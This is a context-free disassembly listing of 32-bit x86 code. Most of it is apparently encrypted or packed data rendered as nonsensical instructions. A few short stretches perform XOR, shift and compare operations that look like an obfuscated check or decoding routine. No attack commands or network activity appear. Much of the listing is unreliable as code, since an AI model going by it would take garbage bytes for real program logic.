  407d47:	jl     0x407db2
  407d49:	sub    cl,BYTE PTR [eax+ebx*8-0x1b]
  407d4d:	imul   ebx,DWORD PTR [esi+edi*8-0x1cca2e12],0x319e2421
  407d58:	mov    esi,0xd4f149ea
  407d5d:	pop    esi
  407d5e:	and    eax,0x108fa12f
  407d63:	retf   
  407d64:	stos   DWORD PTR es:[edi],eax
  407d65:	adc    cl,bh
  407d67:	neg    DWORD PTR [ecx]
  407d69:	in     eax,0xc5
  407d6b:	mov    eax,?
  407d6d:	jno    0x407dda
  407d6f:	fisub  WORD PTR [ebp-0x2c559c5d]
  407d75:	jbe    0x407d03
  407d77:	rdpmc  
  407d79:	pop    es
  407d7a:	jmp    0x407d93
  407d7c:	bound  edx,QWORD PTR [ebp-0x1]
  407d7f:	dec    esp
  407d80:	sub    bh,BYTE PTR [ebx+0x604cdf83]
  407d86:	aas    
  407d87:	js     0x407d3b
  407d89:	(bad)  
  407d8a:	push   esi
  407d8b:	pop    ecx
  407d8c:	cmp    eax,0x9a8ad0ef
  407d91:	xchg   ebx,eax
  407d92:	(bad)  
  407d93:	mov    eax,0x85323455
  407d98:	pop    ebx
  407d99:	inc    edi
  407d9a:	cmp    eax,0x2cb0098
  407d9f:	bound  eax,QWORD PTR [eax-0x2fcf229d]
  407da5:	sub    al,0xfc
  407da7:	icebp  
  407da8:	dec    ecx
  407da9:	cmp    eax,0xc3b4ae2d
  407dae:	clc    
  407daf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407db0:	dec    ebp
  407db1:	xchg   edx,eax
  407db2:	mov    esi,0xaa8397b9
  407db7:	mov    eax,0xad9e64c2
  407dbc:	jo     0x407d41
  407dbe:	fisubr DWORD PTR [edx-0x75]
  407dc1:	ror    DWORD PTR [ebx-0x53f033b3],0xc1
  407dc8:	add    al,cl
  407dca:	loop   0x407dea
  407dcc:	xor    edx,0x40000000
  407dd2:	or     edx,DWORD PTR [ebp-0x64]
  407dd5:	mov    DWORD PTR [ebp-0x30],ecx
  407dd8:	mov    ecx,DWORD PTR [esi]
  407dda:	mov    DWORD PTR [ebp-0x5c],ecx
  407ddd:	shl    DWORD PTR [ebp-0x5c],0x1e
  407de1:	xor    DWORD PTR [ebp-0x5c],0x40000000
  407de8:	mov    DWORD PTR [ebp-0x6c],edx
  407deb:	mov    edx,DWORD PTR [esi+0x4]
  407dee:	mov    edx,DWORD PTR [ebp-0x5c]
  407df1:	xor    ecx,ecx
  407df3:	or     ecx,DWORD PTR [ebp-0x30]
  407df6:	shr    eax,0x2
  407df9:	or     edx,eax
  407dfb:	cmp    ecx,DWORD PTR [ebp-0x70]
  407dfe:	jne    0x4071b0
  407e04:	cmp    edx,DWORD PTR [ebp-0x6c]
  407e07:	je     0x40a9b0
  407e0d:	jmp    0x4071b0
  407e12:	mov    ecx,DWORD PTR [ebx]
  407e14:	mov    eax,DWORD PTR [ebx+0x4]
  407e17:	xor    eax,0x9c1b89e8
  407e1c:	xor    ecx,0xca79a577
  407e22:	shrd   ecx,eax,0x2
  407e26:	shr    eax,0x2
  407e29:	mov    DWORD PTR [ebp-0x6c],eax
  407e2c:	mov    eax,DWORD PTR [ebx]
  407e2e:	mov    edx,DWORD PTR [ebx+0x4]
  407e31:	mov    edx,eax
  407e33:	xor    eax,eax
  407e35:	or     eax,ecx
  407e37:	shl    edx,0x1e
  407e3a:	xor    edx,0x40000000
  407e40:	or     edx,DWORD PTR [ebp-0x6c]
  407e43:	mov    DWORD PTR [ebp-0x68],eax
  407e46:	mov    eax,DWORD PTR [esi]
  407e48:	xor    eax,0xca79a577
  407e4d:	mov    DWORD PTR [ebp+0x14],eax
  407e50:	mov    DWORD PTR [ebp-0x64],edx
  407e53:	mov    edx,DWORD PTR [esi+0x4]
  407e56:	mov    ecx,0x9c1b89e8
  407e5b:	xor    edx,ecx
  407e5d:	mov    eax,edx
  407e5f:	mov    edx,DWORD PTR [ebp+0x14]
  407e62:	shrd   edx,eax,0x2
  407e66:	shr    eax,0x2
  407e69:	jmp    0x408247
  407e6e:	push   ss
  407e6f:	dec    esi
  407e70:	dec    ecx
  407e71:	test   BYTE PTR [eax-0x22],0x27
  407e75:	cs aam 0xd8
  407e78:	sbb    eax,0x752f027e
  407e7d:	jl     0x407ea1
  407e7f:	outs   dx,DWORD PTR ds:[esi]
  407e80:	sbb    BYTE PTR [eax],bl
  407e82:	sahf   
  407e83:	adc    bl,BYTE PTR [eax]
  407e85:	sbb    BYTE PTR [edi],dl
  407e87:	test   DWORD PTR [ebx-0x22],edi
  407e8a:	ds je  0x407ebe
  407e8d:	stos   DWORD PTR es:[edi],eax
  407e8e:	nop
  407e8f:	and    DWORD PTR [ecx+0xa],edi
  407e92:	push   0xf46de405
  407e97:	jns    0x407ed5
  407e99:	retf   
  407e9a:	fadd   QWORD PTR [ecx-0x9]
  407e9d:	xor    al,BYTE PTR [ebx-0x1042bc32]
  407ea3:	test   DWORD PTR [edx+0x597b7d1f],edx
  407ea9:	jnp    0x407f1a
  407eab:	rol    ebp,cl
  407ead:	mov    eax,0xeeec5750
  407eb2:	cmp    eax,0xdcde1faa
  407eb7:	pushf  
  407eb8:	aas    
  407eb9:	mov    esi,edx
  407ebb:	fcomp  DWORD PTR [edx]
  407ebd:	pop    esp
  407ebe:	cld    
  407ebf:	fld    DWORD PTR [edi+0x15357eed]
  407ec5:	inc    esp
  407ec6:	jo     0x407e70
  407ec8:	aas    
  407ec9:	aam    0x20
  407ecb:	mov    esi,0x7ef818ef
  407ed0:	retf   
  407ed1:	mov    ebp,0xbaf780f1
  407ed6:	cmp    dl,BYTE PTR [ebx-0x22]
  407ed9:	popf   
  407eda:	pusha  
  407edb:	push   edx
  407edc:	stos   DWORD PTR es:[edi],eax
  407edd:	sar    BYTE PTR [eax+ebx*2+0x808e178],1
  407ee4:	cmp    DWORD PTR [eax+0x7f7fb954],0x49230ab5
  407eee:	outs   dx,BYTE PTR ds:[esi]
  407eef:	loope  0x407f24
  407ef1:	dec    edx
  407ef2:	lea    esi,[ecx+0x1e]
  407ef5:	mov    bl,0x9d
  407ef7:	jge    0x407f6b
  407ef9:	or     DWORD PTR [eax],ecx
  407efb:	cwde   
  407efc:	mov    al,ds:0x38eca0dd
  407f01:	mov    dh,0xe6
  407f03:	imul   ebp,DWORD PTR [edi+0x2db9d21a],0x69
  407f0a:	in     eax,dx
  407f0b:	dec    esp
  407f0c:	mov    eax,0xab0d5972
  407f11:	nop
  407f12:	xor    dl,bh
  407f14:	push   ss
  407f15:	repz and BYTE PTR [edi],dh
  407f18:	fucomi st,st(7)
  407f1a:	cli    
  407f1b:	in     al,0xaa
  407f1d:	outs   dx,BYTE PTR ds:[esi]
  407f1e:	cli    
  407f1f:	lahf   
  407f20:	mov    edx,0xcd7b9a08
  407f25:	fst    QWORD PTR ds:0x206dfe2
  407f2b:	or     ebp,esi
  407f2d:	sub    BYTE PTR [ebx-0x79cec468],0x66
  407f34:	add    ah,ah
  407f36:	xor    eax,0x7228b7f0
  407f3b:	ret    0xaec9
  407f3e:	ss push esi
  407f40:	cli    
  407f41:	xor    DWORD PTR [ecx+0x6e],ecx
  407f44:	fbstp  TBYTE PTR [ebp+0x55]
  407f47:	add    ebp,DWORD PTR [eax+0x7b]
  407f4a:	sub    eax,DWORD PTR [edx-0x17]
  407f4d:	pop    ebp
  407f4e:	js     0x407f44
  407f50:	lods   al,BYTE PTR ds:[esi]
  407f51:	into   
  407f52:	mov    ds:0xe51ec9e1,al
  407f57:	push   ebx
  407f58:	ficom  DWORD PTR [esp+ecx*8]
  407f5b:	mov    dh,0xd3
  407f5d:	add    BYTE PTR [eax-0x10a5d784],0xa
  407f64:	rol    ebp,cl
  407f66:	mov    dh,0xe6
  407f68:	ss mov bl,0xe7
  407f6b:	mov    dl,0xf6
  407f6d:	mov    cl,0x9f
  407f6f:	icebp  
  407f70:	mov    dl,0xf4
  407f72:	int3   
  407f73:	sub    esp,DWORD PTR [esi]
  407f75:	popa   
  407f76:	mov    cl,0x8c
  407f78:	and    esi,DWORD PTR [ebp+edx*8+0x2]
  407f7c:	int    0xb3
  407f7e:	pop    ecx
  407f7f:	lea    esi,[esi]
  407f81:	push   ebx
  407f82:	and    BYTE PTR [ebx+0x1e],al
  407f85:	pop    ecx
  407f86:	jecxz  0x407f1d
  407f88:	lods   al,BYTE PTR ds:[esi]
  407f89:	int3   
  407f8a:	mov    ch,0xa
  407f8c:	sahf   
  407f8d:	fisubr DWORD PTR [ebx-0x1363acf3]
  407f93:	and    al,0xc5
  407f95:	addr16 pop esp
  407f97:	daa    
  407f98:	je     0x408000
  407f9a:	dec    esi
  407f9b:	sbb    al,0x30
  407f9d:	push   0xffffffea
  407f9f:	repz push es
  407fa1:	test   DWORD PTR [ebx],edi
  407fa3:	push   ss
  407fa4:	mov    al,0xca
  407fa6:	stc    
  407fa7:	xor    BYTE PTR [edi-0x2ddc2b08],0x47
  407fae:	(bad)  
  407faf:	mov    eax,DWORD PTR [esi]
  407fb1:	xor    eax,0x49f3d3b1
  407fb6:	adc    bl,dh
  407fb8:	cmp    BYTE PTR [ebx+0x1314f33c],0xda
  407fbf:	dec    edx
  407fc0:	push   ecx
  407fc1:	xchg   ebx,eax
  407fc2:	jg     0x40800d
  407fc4:	nop
  407fc5:	fwait
  407fc6:	xor    eax,0x9b55dc58
  407fcb:	pop    ss
  407fcc:	(bad)  
  407fcd:	jl     0x407fd4
  407fcf:	out    0x59,al
  407fd1:	test   DWORD PTR [ecx],ebx
  407fd3:	dec    ebx
  407fd4:	in     al,0x98
  407fd6:	inc    esp
  407fd7:	mov    esi,0xd96f0637
  407fdc:	lahf   
  407fdd:	cli    
  407fde:	fisttp DWORD PTR [ebx]
  407fe0:	test   BYTE PTR [eax-0x20],dl
  407fe3:	ins    BYTE PTR es:[edi],dx
  407fe4:	xchg   ebp,eax
  407fe5:	mov    eax,ds:0xdb5600df
  407fea:	bound  ecx,QWORD PTR [ebx+0x5dd23ecc]
  407ff0:	xor    edi,ebx
  407ff2:	icebp  
  407ff3:	adc    al,0xbe
  407ff5:	sub    al,0xa5
  407ff7:	dec    ecx
  407ff8:	pop    edi
  407ff9:	mov    eax,0x5a1f21df
  407ffe:	cmc    
  407fff:	in     al,dx
  408000:	out    dx,al
  408001:	and    edi,DWORD PTR [ecx]
  408003:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408004:	adc    esi,DWORD PTR [ebp+0x4e]
  408007:	or     DWORD PTR [edi+0x5c],0xffffffbb
  40800b:	leave  
  40800c:	adc    dl,BYTE PTR [ebp-0x56]
  40800f:	push   ds
  408010:	neg    ch
  408012:	cs pop ds
  408014:	sbb    DWORD PTR [edi],edi
  408016:	sbb    al,ah
  408018:	inc    ebx
  408019:	ds sub dh,BYTE PTR ds:[eax-0x1a]
  40801e:	add    cl,dh
  408020:	adc    edx,DWORD PTR [edx-0x55e2dc6b]
  408026:	xchg   edi,eax
  408027:	cmp    DWORD PTR [edi],eax
  408029:	test   al,0x34
  40802b:	add    dl,al
  40802d:	dec    ecx
  40802e:	lds    eax,FWORD PTR [edi+eiz*4]
  408031:	in     eax,0xde
  408033:	and    BYTE PTR [edx+0x27],bh
  408036:	cmp    ecx,DWORD PTR [esi+0x32]
  408039:	inc    edi
  40803a:	std    
  40803b:	cld    
  40803c:	jbe    0x407fe4
  40803e:	jae    0x4080b4
  408040:	pop    di
  408042:	jb     0x4080b8
  408044:	xchg   ecx,eax
  408045:	sar    DWORD PTR [esi],0x9
  408048:	dec    ebx
  408049:	ficomp DWORD PTR [ebx+eax*2-0x43]
  40804d:	xor    al,cl
  40804f:	lods   eax,DWORD PTR ds:[esi]
  408050:	rcr    dl,0x4a
  408053:	pop    ebp
  408054:	xchg   edi,edi
  408056:	mov    dl,0x8c
  408058:	or     BYTE PTR [eax+0x7c],dh
  40805b:	fld    DWORD PTR [edi]
  40805d:	mov    esp,0xda03bdcb
  408062:	ficomp DWORD PTR [esi+edi*8+0x19]
  408066:	adc    eax,0x9c1277e1
  40806b:	fidivr WORD PTR [ebx]
  40806d:	inc    ebp
  40806e:	ja     0x4080d2
  408070:	mov    BYTE PTR gs:[eax-0x171a6f9e],ah
  408077:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408078:	adc    DWORD PTR [ebx],0xc1237c86
  40807e:	jbe    0x40803e
  408080:	mov    edi,0xcbd6f3e8
  408085:	out    0xfb,eax
  408087:	fsub   st,st(2)
  408089:	cmp    ah,BYTE PTR [eax+eax*2+0x6e]
  40808d:	mov    esp,0x3a5cdd6b
  408092:	sbb    eax,0x16eee6bc
  408097:	mov    ebp,0xdaed4766
  40809c:	jp     0x408039
  40809e:	and    eax,0x896b74a0
  4080a3:	push   0xd0f2184d
  4080a8:	sahf   
  4080a9:	stc    
  4080aa:	add    BYTE PTR [ecx+0x4e],0x4
  4080ae:	lods   eax,DWORD PTR ds:[esi]
  4080af:	aam    0xd5
  4080b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4080b2:	xchg   ecx,eax
  4080b3:	dec    esp
  4080b4:	mov    edx,0x9d04e3c9
  4080b9:	push   ebx
  4080ba:	push   ebp
  4080bb:	test   BYTE PTR [ecx+0x7a6d4dca],cl
  4080c1:	inc    edi
  4080c2:	mov    BYTE PTR [edi-0x25e92584],0x59
  4080c9:	scas   al,BYTE PTR es:[edi]
  4080ca:	lods   eax,DWORD PTR ds:[esi]
  4080cb:	sbb    eax,0x3fa2bc2e
  4080d0:	cld    
  4080d1:	push   cs
  4080d2:	mulps  xmm1,xmm1
  4080d5:	xchg   edx,eax
  4080d6:	bound  esi,QWORD PTR [edi-0x3dfd003f]
  4080dc:	adc    eax,0x61bed263
  4080e1:	test   dh,dl
  4080e3:	std    
  4080e4:	fs sub eax,0x62687575
  4080ea:	mov    esi,0xd7114d98
  4080ef:	pop    edx
  4080f0:	or     esp,ebx
  4080f2:	je     0x4080f7
  4080f4:	lods   eax,DWORD PTR ds:[esi]
  4080f5:	mov    esp,edx
  4080f7:	xor    DWORD PTR [edi-0x69],ebx
  4080fa:	lods   eax,DWORD PTR ds:[esi]
  4080fb:	ret    
  4080fc:	repz jae 0x408142
  4080ff:	das    
  408100:	push   eax
  408101:	test   ecx,0x803cd481
  408107:	mov    ebx,DWORD PTR [eax]
  408109:	mov    ch,0xfb
  40810b:	pop    ds
  40810c:	push   esi
  40810d:	shufps xmm3,XMMWORD PTR [ecx-0x16],0xae
  408112:	dec    edi
  408113:	sub    eax,0xc5160d53
  408118:	jo     0x408163
  40811a:	je     0x408177
  40811c:	pop    esp
  40811d:	scas   al,BYTE PTR es:[edi]
  40811e:	jge    0x408192
  408120:	in     al,dx
  408121:	jns    0x408121
  408123:	les    ebp,FWORD PTR [ebx+0x387281c]
  408129:	pushf  
  40812a:	or     eax,0x3070f7a8
  40812f:	outs   dx,DWORD PTR ds:[esi]
  408130:	cwde   
  408131:	je     0x40816f
  408133:	sbb    al,0x43
  408135:	stos   BYTE PTR es:[edi],al
  408136:	popa   
  408137:	dec    eax
  408138:	leave  
  408139:	ja     0x4080df
  40813b:	inc    esi
  40813c:	lods   eax,DWORD PTR ds:[esi]
  40813d:	std    
  40813e:	mov    dl,0x38
  408140:	jnp    0x408100
  408142:	nop
  408143:	sar    BYTE PTR [ebp-0x11],0x8b
  408147:	dec    ebx
  408148:	loope  0x408146
  40814a:	pop    ds
  40814b:	aad    0xdb
  40814d:	xchg   edi,eax
  40814e:	addr16 sub eax,0x85d0121b
  408154:	loopne 0x408145
  408156:	or     eax,0xa4f86914
  40815b:	stos   BYTE PTR es:[edi],al
  40815c:	jnp    0x4081b4
  40815e:	into   
  40815f:	repnz (bad) 
  408161:	in     eax,0xa1
  408163:	pop    es
  408164:	je     0x4081cf
  408166:	jne    0x408158
  408168:	gs add eax,0xbf1fe3df
  40816e:	in     al,0xd1
  408170:	push   eax
  408171:	push   0x84b6e595
  408176:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408177:	fcmovnb st,st(4)
  408179:	(bad)  [esi]
  40817b:	int3   
  40817c:	mov    ds:0x747b720e,al
  408181:	pop    ecx
  408182:	pop    esp
  408183:	xchg   ebp,eax
  408184:	arpl   WORD PTR [ebp+0x1628f621],cx
  40818a:	xlat   BYTE PTR ds:[ebx]
  40818b:	lock push esp
  40818d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40818e:	clc    
  40818f:	(bad)  
  408190:	jns    0x4081a9
  408192:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408193:	inc    eax
  408194:	(bad)  
  408195:	daa    
  408196:	leave  
  408197:	fs mov al,0xc8
  40819a:	aas    
  40819b:	test   bh,0x12
  40819e:	cmp    ch,BYTE PTR ds:0xa0a897ba
  4081a4:	imul   ebp,DWORD PTR [eax],0xfffffff3
  4081a7:	mov    cl,0x14
  4081a9:	das    
  4081aa:	add    BYTE PTR [ebp*2-0x170ba551],ch
  4081b1:	je     0x408135
  4081b3:	daa    
  4081b4:	mov    ch,0xbf
  4081b6:	sub    edi,DWORD PTR [esi+edx*2+0x9]
  4081ba:	mov    esi,0x32ed8e29
  4081bf:	lods   al,BYTE PTR ds:[esi]
  4081c0:	adc    eax,0x45b2b066
  4081c5:	stos   BYTE PTR es:[edi],al
  4081c6:	cdq    
  4081c7:	and    bl,bh
  4081c9:	push   eax
  4081ca:	icebp  
  4081cb:	jle    0x4081ac
  4081cd:	(bad)  
  4081ce:	jmp    0x8919:0xdda8e7c8
  4081d5:	nop
  4081d6:	jne    0x408186
  4081d8:	push   0x98d0a592
  4081dd:	sbb    eax,0x72592660
  4081e2:	mov    ds:0xdc5dce9f,eax
  4081e7:	(bad)  
  4081e8:	je     0x4081a2
  4081ea:	mov    esp,esi
  4081ec:	inc    ebp
  4081ed:	fst    QWORD PTR [ebx+0x5d9ecc93]
  4081f3:	add    DWORD PTR [edx],ebp
  4081f5:	and    DWORD PTR [ecx-0x27],ebx
  4081f8:	test   DWORD PTR [edx+0x6f],0xf945d166
  4081ff:	imul   ebp,ebx,0xffffff8a
  408202:	push   eax
  408203:	sbb    BYTE PTR [edi-0x29ab78ce],dh
  408209:	ins    BYTE PTR es:[edi],dx
  40820a:	mov    ds:0x879c8469,al
  40820f:	mov    ch,0xb4
  408211:	popf   
  408212:	mov    edx,0x9106ae58
  408217:	xchg   esi,eax
  408218:	popf   
  408219:	mov    ds:0x3ff4fd7d,eax
  40821e:	or     dl,dl
  408220:	icebp  
  408221:	push   eax
  408222:	inc    eax
  408223:	sbb    eax,0x26bc6cb
  408228:	mov    edi,0x9b2f3bbf
  40822d:	or     eax,0x290a4e59
  408232:	mov    dl,0xab
  408234:	sub    eax,0x308ed9e
  408239:	sub    ah,bl
  40823b:	xor    esp,esp
  40823d:	out    dx,eax
  40823e:	jnp    0x408260
  408240:	ja     0x408294
  408242:	add    esi,ecx
  408244:	jp     0x4081d3
  408246:	call   0x8bd4c7d4
  40824b:	push   es
  40824c:	mov    DWORD PTR [ebp+0x14],eax
  40824f:	shl    DWORD PTR [ebp+0x14],0x1e
  408253:	xor    DWORD PTR [ebp+0x14],0x40000000
  40825a:	xor    eax,eax
  40825c:	mov    DWORD PTR [ebp-0x70],edx
  40825f:	or     eax,DWORD PTR [ebp-0x70]
  408262:	mov    edx,DWORD PTR [esi+0x4]
  408265:	mov    DWORD PTR [ebp-0x60],eax
  408268:	mov    eax,DWORD PTR [ebp+0x14]
  40826b:	or     eax,DWORD PTR [ebp-0x6c]
  40826e:	mov    DWORD PTR [ebp-0x5c],eax
  408271:	mov    eax,DWORD PTR [ebp-0x68]
  408274:	cmp    DWORD PTR [ebp-0x60],eax
  408277:	jmp    0x408655
  40827c:	xchg   edx,eax
  40827d:	hlt    
  40827e:	xchg   ebp,eax
  40827f:	addr16 jb 0x4082e9
  408282:	(bad)  
  408283:	in     al,0x70
  408285:	mov    edx,0xc641709d
  40828a:	dec    ebx
  40828b:	jle    0x408235
  40828d:	sbb    BYTE PTR [bx+si],bl
  408290:	sahf   
  408291:	adc    bl,BYTE PTR [eax]
  408293:	sbb    bh,bl
  408295:	mov    ds:0x7770f7e8,eax
  40829a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40829b:	inc    cx
  40829d:	ss cwde 
  40829f:	xchg   esp,eax
  4082a0:	sub    DWORD PTR [ecx-0x6735ab98],esi
  4082a6:	mov    edx,0x55f194ce
  4082ab:	add    eax,DWORD PTR [ebx]
  4082ad:	cdq    
  4082ae:	out    dx,eax
  4082af:	cmp    eax,0x4f0b0fe1
  4082b4:	sahf   
  4082b5:	push   0xffffffc4
  4082b7:	aam    0x64
  4082b9:	leave  
  4082ba:	adc    BYTE PTR [esi+0x7],0xa0
  4082be:	outs   dx,DWORD PTR ds:[esi]
  4082bf:	xchg   edx,eax
  4082c0:	pusha  
  4082c1:	cmp    ebx,edx
  4082c3:	inc    edi
  4082c4:	pop    ecx
  4082c5:	popa   
  4082c6:	xlat   BYTE PTR ds:[ebx]
  4082c7:	ss dec ecx
  4082c9:	shl    DWORD PTR [edi],cl
  4082cb:	(bad)  
  4082cc:	mov    ds:0xfcc487ee,eax
  4082d1:	adc    al,0xd4
  4082d3:	push   es
  4082d4:	pop    es
  4082d5:	iret   
  4082d6:	push   0x489b9e7d
  4082db:	sbb    eax,0x74b4a762
  4082e0:	add    eax,0xaeaa8b6c
  4082e5:	sahf   
  4082e6:	clc    
  4082e7:	or     DWORD PTR [edi-0x69e1df99],esp
  4082ed:	out    0xdd,eax
  4082ef:	fbld   TBYTE PTR [ecx]
  4082f1:	imul   ebp,ebp,0xc
  4082f4:	aam    0xd
  4082f6:	inc    ecx
  4082f7:	and    BYTE PTR [edi+esi*1],bh
  4082fa:	and    esi,DWORD PTR [ebx+edx*4-0x773ab579]
  408301:	inc    ebx
  408302:	std    
  408303:	and    al,0xa6
  408305:	mov    ds,ebp
  408307:	(bad)  
  408308:	xchg   edi,eax
  408309:	ins    BYTE PTR es:[edi],dx
  40830a:	pop    edi
  40830b:	fdivr  QWORD PTR [eax-0x70]
  40830e:	sbb    al,0x55
  408310:	and    eax,0xe8b50942
  408315:	xchg   ebp,eax
  408316:	push   cs
  408317:	mov    ebx,DWORD PTR [ecx+0x277598e5]
  40831d:	push   0x5832bb9a
  408322:	test   eax,0x17246776
  408327:	mov    ebp,0xd76ec558
  40832c:	pushf  
  40832d:	enter  0xe69e,0x9a
  408331:	sbb    al,0x42
  408333:	cmp    ebx,DWORD PTR [ebx-0x4f]
  408336:	(bad)  
  408338:	or     cl,0x4f
  40833b:	mov    ecx,0x8a8b4daf
  408340:	jmp    0xd3b7:0x7ed0f98c
  408347:	mov    esp,0x783263af
  40834c:	sbb    al,0xd0
  40834e:	and    DWORD PTR [esp+edi*2-0xc],edx
  408352:	call   0x357c6422
  408357:	jno    0x4082fa
  408359:	pop    edi
  40835a:	loope  0x408382
  40835c:	jp     0x40831b
  40835e:	jl     0x4083ae
  408360:	and    BYTE PTR [edi+edi*8],dl
  408363:	inc    ebx
  408364:	mov    al,ds:0x3c77246d
  408369:	callw  0xda2d
  40836d:	(bad)  
  40836e:	ret    
  40836f:	add    al,0x48
  408371:	hlt    
  408372:	pop    edi
  408373:	sahf   
  408374:	mov    eax,ds:0x45687559
  408379:	bound  eax,QWORD PTR [ecx-0x1a]
  40837c:	jle    0x408399
  40837e:	mov    ds:0xc8b96e36,al
  408383:	js     0x4083e1
  408385:	hlt    
  408386:	shl    BYTE PTR [ebp-0x7be96f73],0x12
  40838d:	rcl    BYTE PTR [ebx],0x1b
  408390:	aam    0x8f
  408392:	ja     0x4083aa
  408394:	stc    
  408395:	daa    
  408396:	mov    fs,WORD PTR ds:0xa19f00ab
  40839c:	push   ds
  40839d:	jecxz  0x4083c2
  40839f:	push   0xb546b480
  4083a4:	lahf   
  4083a5:	fcmovnb st,st(4)
  4083a7:	and    al,0xe
  4083a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4083aa:	fstp   TBYTE PTR es:[eax-0x7517712]
  4083b1:	inc    edi
  4083b2:	xor    ah,bh
  4083b4:	jne    0x40837b
  4083b6:	and    ah,al
  4083b8:	mov    WORD PTR [eax+0x5d],ss
  4083bb:	(bad)  
  4083bc:	aas    
  4083bd:	dec    esp
  4083be:	shl    DWORD PTR [esi+0x21e2f59a],0x29
  4083c5:	div    DWORD PTR [edx+eax*2+0x7c]
  4083c9:	cmp    eax,0x9e0ba5b6
  4083ce:	stos   BYTE PTR es:[edi],al
  4083cf:	xor    esp,DWORD PTR [edi+eax*1+0xe5fc1d3]
  4083d6:	mov    ah,0x4a
  4083d8:	outs   dx,DWORD PTR ds:[esi]
  4083d9:	push   es
  4083da:	cmp    eax,0x25ef4f6f
  4083df:	loopne 0x4083cd
  4083e1:	sar    DWORD PTR [esp+esi*1+0x1c],cl
  4083e5:	mov    edi,0x877b6a61
  4083ea:	mov    edi,0x87331fdd
  4083ef:	or     eax,0x88f87bea
  4083f4:	jg     0x408395
  4083f6:	out    dx,al
  4083f7:	mov    esp,0x41a50dca
  4083fc:	inc    ecx
  4083fd:	ret    
  4083fe:	xor    DWORD PTR [edx-0x7ab6a0a7],eax
  408404:	loop   0x4083f4
  408406:	mov    dl,0x75
  408409:	enter  0x1489,0x3b
  40840d:	icebp  
  40840e:	and    cl,bl
  408410:	ret    0xf554
  408413:	mov    ecx,0x4b076ba8
  408418:	cmc    
  408419:	ins    BYTE PTR es:[edi],dx
  40841a:	scas   eax,DWORD PTR es:[edi]
  40841b:	jne    0x408468
  40841d:	inc    ecx
  40841e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40841f:	sbb    cl,al
  408421:	ret    0x401b
  408424:	loop   0x408493
  408426:	cwde   
  408427:	int3   
  408428:	and    edi,DWORD PTR [ebp+esi*2-0x2249a643]
  40842f:	mov    al,ds:0x9805c74c
  408434:	push   edx
  408435:	add    BYTE PTR [ebp-0x2d],0xfd
  408439:	jecxz  0x408490
  40843b:	sahf   
  40843c:	ja     0x40845d
  40843e:	and    edi,DWORD PTR ds:0xdc56d3ef
  408444:	sbb    eax,0x91e6a4c0
  408449:	pop    esi
  40844a:	rcl    DWORD PTR [ebx],1
  40844c:	inc    ecx
  40844d:	push   esi
  40844e:	mov    DWORD PTR [edx-0x3c],0xdc81e244
  408455:	aad    0x42
  408457:	pop    ds
  408458:	enter  0x4f28,0x37
  40845c:	shl    DWORD PTR [edi],cl
  40845e:	cmp    BYTE PTR [eax],ah
  408460:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408461:	xchg   edx,eax
  408462:	sahf   
  408463:	es retf 
  408465:	jl     0x408448
  408467:	xchg   ebp,eax
  408468:	rcl    DWORD PTR [edi+0x50],0xb5
  40846c:	js     0x408409
  40846e:	push   edi
  40846f:	mov    ecx,0xb46a594a
  408474:	mov    dh,0x3e
  408476:	sbb    eax,0x1de69c59
  40847b:	leave  
  40847c:	push   ebp
  40847d:	and    cl,BYTE PTR [esi-0x33496549]
  408483:	shl    BYTE PTR [esi],cl
  408485:	cwde   
  408486:	(bad)  
  408487:	mov    al,0xaf
  408489:	inc    ax
  40848b:	mov    bh,0x67
  40848d:	xor    ebx,DWORD PTR [ecx-0x3d7cea38]
  408493:	sbb    eax,0x5ce2a010
  408498:	fst    DWORD PTR ds:0x12a2fa8
  40849e:	and    bh,bh
  4084a0:	dec    eax
  4084a1:	adc    eax,0xbea6c102
  4084a6:	cmp    esi,esi
  4084a8:	jmp    0xd671:0x1c94ae7c
  4084af:	shl    DWORD PTR [esi],1
  4084b1:	cs push ecx
  4084b3:	xor    eax,0x47998f1a
  4084b8:	fs mov esi,0x908d6468
  4084be:	inc    esp
  4084bf:	sbb    esi,DWORD PTR [edx+0x1e]
  4084c2:	iret   
  4084c3:	test   ah,bl
  4084c5:	into   
  4084c6:	cwde   
  4084c7:	and    dl,BYTE PTR [ecx+esi*2-0x17]
  4084cb:	fbstp  TBYTE PTR [ebx]
  4084cd:	mov    edx,0xef25ddc4
  4084d2:	das    
  4084d3:	popf   
  4084d4:	mov    al,0x1b
  4084d6:	(bad)  
  4084d7:	xchg   ecx,eax
  4084d8:	pop    es
  4084d9:	outs   dx,DWORD PTR ds:[esi]
  4084da:	loopne 0x40850e
  4084dc:	test   eax,0xf97ab592
  4084e1:	inc    esi
  4084e2:	sub    DWORD PTR [edi],ebx
  4084e4:	ins    DWORD PTR es:[edi],dx
  4084e5:	stos   BYTE PTR es:[edi],al
  4084e6:	out    dx,al
  4084e7:	pop    edi
  4084e8:	xchg   edi,eax
  4084e9:	jbe    0x408516
  4084eb:	dec    edx
  4084ec:	mov    ?,WORD PTR [edi+eiz*2+0x6c]
  4084f0:	jne    0x408563
  4084f2:	lods   al,BYTE PTR ds:[esi]
  4084f3:	lock cmc 
  4084f5:	xor    ebx,DWORD PTR [eax+0x1]
  4084f8:	adc    eax,0x7664d485
  4084fd:	call   DWORD PTR [edx]
  4084ff:	cmp    eax,DWORD PTR ds:0xddae35fa
  408505:	test   BYTE PTR [edi-0x6b],cl
  408508:	hlt    
  408509:	mov    ecx,0xb35a1e39
  40850e:	in     al,dx
  40850f:	inc    edi
  408510:	loopne 0x4084f1
  408512:	add    eax,0x6eeebe08
  408517:	cmp    al,0x76
  408519:	fwait
  40851a:	das    
  40851b:	jne    0x408559
  40851d:	push   es
  40851e:	push   ebx
  40851f:	ins    DWORD PTR es:[edi],dx
  408520:	ins    BYTE PTR es:[edi],dx
  408521:	mov    ds:0x2d716e03,eax
  408526:	rol    esi,0x71
  408529:	cli    
  40852a:	fmulp  st(3),st
  40852c:	repnz mov WORD PTR [ebx+0x5a1fff0d],es
